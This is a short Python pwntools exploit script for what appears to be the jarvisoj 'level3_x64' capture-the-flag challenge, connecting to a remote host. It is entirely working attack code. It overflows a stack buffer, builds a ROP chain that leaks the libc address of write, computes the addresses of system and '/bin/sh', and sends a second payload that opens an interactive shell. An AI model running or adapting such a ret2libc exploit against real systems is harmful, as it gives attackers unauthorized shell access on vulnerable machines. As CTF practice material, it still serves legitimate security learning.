#!usr/bin/env python 
# -*- coding: utf-8 -*-


from pwn import *
# context.log_level = 'debug'
io = remote("pwn2.jarvisoj.com",9883)
elf = ELF("./level3_x64")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
func = elf.symbols["vulnerable_function"]

libc = ELF("./libc-2.19.so")
write_libc = libc.symbols["write"]
sys_libc = libc.symbols["system"]
bin_libc = libc.search("/bin/sh").next()

rdi_ret = 0x4006B3
rsi_ret = 0x4006B1
payload1 = 'a' * 0x88
payload1 += p64(rdi_ret) + p64(1)
payload1 += p64(rsi_ret) + p64(write_got) + p64(0xdeadbeef)
payload1 += p64(write_plt) + p64(func)

io.recvline()
io.sendline(payload1)
write_addr = u64(io.recv(8))
sys_addr = write_addr - write_libc + sys_libc
bin_addr = write_addr - write_libc + bin_libc

payload2 = 'a' * 0x88
payload2 += p64(rdi_ret) + p64(bin_addr)
payload2 += p64(sys_addr) + p64(0xdeadbeef)

io.recvline()
io.sendline(payload2)
io.interactive()
io.close()





